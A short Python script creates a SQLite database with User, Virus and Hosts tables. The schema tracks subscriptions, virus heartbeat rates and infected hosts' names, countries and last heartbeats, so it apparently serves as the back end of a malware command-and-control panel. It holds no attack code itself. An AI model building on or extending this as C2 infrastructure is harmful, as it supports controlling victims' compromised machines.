import sqlite3
# Set up a connection to the database file
conn = sqlite3.connect('instance/databasen.db')

# Set up a cursor object to execute SQL commands
cursor = conn.cursor()

# Create the "User,Virus and Hosts" table if it does not already exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS User (
        id INTEGER PRIMARY KEY,
        email TEXT,
        password TEXT,
        public_key TEXT,
        subscription_status TEXT
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS Virus (
        id INTEGER PRIMARY KEY,
        type TEXT,
        name TEXT,
        heartbeat_rate TEXT,
        public_key TEXT,
        user_id INTEGER
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS Hosts (
        id INTEGER PRIMARY KEY,
        pc_name TEXT,
        country TEXT,
        host_notes TEXT,
        settings TEXT,
        last_heartbeat TEXT,
        user_id INTEGER,
        virus_id INTEGER
    )
''')
# Commit the changes to the database
conn.commit()

# Close the connection to the database
conn.close()
